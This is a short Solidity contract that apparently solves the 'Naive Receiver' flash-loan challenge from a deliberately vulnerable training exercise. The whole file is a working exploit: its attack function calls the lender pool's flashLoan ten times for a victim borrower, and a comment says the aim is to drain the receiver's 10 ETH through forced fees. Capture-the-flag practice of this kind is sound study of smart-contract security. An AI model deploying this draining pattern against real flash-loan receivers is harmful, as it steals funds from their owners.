// SPDX-License-Identifier: MIT

import "../naive-receiver/NaiveReceiverLenderPool.sol";

pragma solidity ^0.8.0;

contract NaiveReceiverAttacker {
    function attack(address borrower, address payable lenderpool) external {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(lenderpool);
        // Receiver has 10 ETH: do 10 loans to drain his account by
        // forcing him to pay fees
        for(uint i=0; i<10; i++) {
            pool.flashLoan(borrower, 0);
        }
    }
}